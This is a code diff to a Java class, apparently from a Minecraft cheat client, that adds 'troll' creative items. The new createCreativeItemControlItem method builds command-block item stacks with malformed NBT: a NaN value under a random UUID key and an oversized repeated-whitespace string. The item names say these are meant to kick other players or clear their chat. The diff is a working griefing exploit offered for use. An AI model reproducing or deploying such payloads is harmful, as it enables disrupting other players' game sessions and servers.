@@ -34,6 +34,7 @@ import net.minecraft.util.Identifier;
 
 import java.util.Arrays;
 import java.util.List;
+import java.util.UUID;
 
 import static de.nekosarekawaii.vandalism.util.game.ItemStackUtil.withClientSide;
 
@@ -68,6 +69,8 @@ public class TrollItemsCreativeTab extends AbstractCreativeTab {
         items.add(withClientSide(createWardenSummonBlock(), Text.literal(Formatting.DARK_AQUA + Formatting.BOLD.toString() + "Warden Summon Block")));
         items.add(withClientSide(createUnstableTNTBlock(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Unstable TNT Block")));
         items.add(withClientSide(createGroundBugBoots(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Ground Bug Boots")));
+        items.add(withClientSide(createCreativeItemControlItem(true), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Creative Item Control (Kick)")));
+        items.add(withClientSide(createCreativeItemControlItem(false), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Creative Item Control (Clear Chat)")));
     }
 
     private static ItemStack createTrollPotion(final ItemStack origin) {
@@ -311,6 +314,18 @@ public class TrollItemsCreativeTab extends AbstractCreativeTab {
         blockEntityTag.put("Items", items);
         base.put("BlockEntityTag", blockEntityTag);
         item.setNbt(base);
+        return item;
+    }
+
+    private static ItemStack createCreativeItemControlItem(final boolean kick) {
+        final ItemStack item = new ItemStack(Items.COMMAND_BLOCK);
+        final NbtCompound tag = new NbtCompound();
+        tag.putDouble(UUID.randomUUID().toString(), Double.NaN);
+        final StringBuilder hacked = new StringBuilder(), toAdd = new StringBuilder();
+        for (int i = 0; i < (kick ? 5 : 8); i++) toAdd.append(' ').append(toAdd);
+        for (int i = 0; i < (kick ? 900 : 2000); i++) hacked.append(kick ? "§c§l" : "").append(toAdd);
+        tag.putString("z", hacked.toString());
+        item.setNbt(tag);
         return item;
     }
 
